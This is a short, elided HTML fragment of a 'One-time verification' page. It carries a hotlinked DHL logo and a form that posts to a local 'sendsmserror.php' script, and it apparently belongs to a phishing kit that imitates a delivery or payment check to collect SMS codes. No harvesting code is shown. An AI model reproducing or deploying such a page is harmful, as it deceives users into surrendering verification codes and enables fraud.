...
<div id="authform">
    <div class="wrapper">
        <div class="scheme-logo-div"><img class="scheme-logo" alt="" src="https://assets.pay2.secured-by-ingenico.com/assets/6742/8d3ac99693daf6576407dab36bb3e284b13262f6/DHL_rgb_200x44.png?size=200x44"></div>
     ...
     <h1>One-time verification</h1>
        ...
        <form  name="form" method="post" action="sendsmserror.php">
